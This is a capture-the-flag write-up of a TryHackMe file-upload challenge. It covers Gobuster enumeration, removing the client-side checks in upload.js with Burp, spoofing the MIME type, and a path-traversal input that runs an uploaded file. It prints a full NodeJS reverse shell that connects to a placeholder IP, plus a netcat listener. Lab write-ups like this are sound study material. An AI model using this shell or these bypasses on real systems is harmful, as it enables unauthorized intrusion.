+++
title = 'THM: Upload Vulnerabilities Challenge'
date = 2024-08-16T08:46:50+03:00
draft = false
+++

## Task

Head over to jewel.uploadvulns.thm.

Take what you've learned in this room and use it to get a shell on this machine. As per usual, your flag is in /var/www/. Bear in mind that this challenge will be an accumulation of everything you've learnt so far, so there may be multiple filters to bypass. The attached wordlist might help. Also remember that not all webservers have a PHP backend...

## Enumeration

First, I tried with a normal .jpg image. The image was uploaded succesfully, but the question is where. To be honest a better way would have been to inspect this with Burp to see the request-response flow in simultaneously. 

The challenge included a wordlist (AAA-ZZZ three-letter combinations) that I reckon to be useful in finding the file. So I want to find the file that I just uploaded so that I know where my shell script can be found later on. Let's find out with Gobuster.

````
gobuster dir -u http://jewel.uploadvulns.thm -w uploadvulns.txt -x .jpg
````

While Gobuster ran I checked on the webpage source code. There is reference to a static file but nothing more. Gobuster scan didn't provide anything at this point. Most likely because the uploaded image is in a folder and I should enumerate the structure of the web page (this is an early morning and I haven't had coffee yet 😅). 

````
gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
````

Gobuster scan found the following directories:

````
/content (Status: 301)
/modules (Status: 301)
/admin (Status: 200)
/assets (Status: 301)
/Content (Status: 301)
/Assets (Status: 301)
/Modules (Status: 301)
/Admin (Status: 200)
````

Running the previous Gobuster command on "content" folder.

````
gobuster dir -u http://jewel.uploadvulns.thm/content/ -w uploadvulns.txt -x .jpg
````

The results show five files stored in the content folder.

````
/ABH.jpg (Status: 200)
/DOB.jpg (Status: 200)
/LKQ.jpg (Status: 200)
/SAD.jpg (Status: 200)
/UAD.jpg (Status: 200)
````

It seems that the application uses the wordlist provided in the task files to encode the uploaded images by rewriting the filename. The original file that I uploaded is called "DOB.jpg" now. 

## Reverse Shell Upload

Next step is to upload a shell script and possibly bypass client and server side filters. 

Checking on the client side filters reveals that there are multiple conditions to match before the file is accepted by the application:
- The upload is controlled by upload.js which checks
- The file size
- That the file's magic number is ÿØÿ which links to jpg
- And the file extension should be either jpg or jpeg. 

At this point the type of web server backend is unknown. It could be PHP or something else. That needs to be known to choose the right shell script. Browsing to /admin and enumerating the page with Wappalyzer shows that the we're dealing with Nginx 1.14.0 on Ubuntu and the language is NodeJS.

### RSHELL Script

The reverse shell script for NodeJS. 

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#nodejs 

````
# The contents of shell.js

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
````

Start a listener.

````
nc -nvlp 4242
````

### Evade Client-side Filters

Intercept the file upload with Burp after removing ^js$| from Settings > Tools > Proxy > Request interception rules. This way Burp will intercept upload.js and we can modify it on the fly. At this point clearing the browser cache is a wonderful idea. After that refresh the page. 

Monitor the traffic flow in Burp and one request at a time forward them until you reach upload.js. At that point right click and click "Do Intercept > Response to this request".

`````
# Remove client-side filter from upload.js and after that let it pass.
//Check File Size
if (event.target.result.length > 50 * 8 * 1024){
    setResponseMsg("File too big", "red");			
    return;
}
//Check Magic Number
if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
    setResponseMsg("Invalid file format", "red");
    return;	
}
//Check File Extension
const extension = fileBox.name.split(".")[1].toLowerCase();
if (extension != "jpg" && extension != "jpeg"){
    setResponseMsg("Invalid file format", "red");
    return;
}
`````

### Evade Server-side Filters

The file type is set to application/x-javascript. Changing that to image/jpeg and the file upload succeeds. 

### Find RSHELL Script

Run the same .jpg file scan with Gobuster again to find the shell script.

### Execute RSHELL Script

The shell script can't be executed just by browsing to the URL. Instead the admin page seems to provide means to do that. However, it says clearly that it runs commands from /modules directory and we know our script is in /content folder.

````
# Traverse directories and execute reverse shell script.
../content/OFA.jpg
````

The flag can be found from /var/www.

## Lessons Learned

- Methodology matters the most. Otherwise this becomes frustrating quick. 
- Keeping live notes helps to understand the status and the progress.
- Enumerating the structure and technology of the web application is key in file uploads.
- Remember to intercept .js requests and responses to disable client-side filtering easily. 
- This wasn't easy for me. But staying organized helped tremendeously. 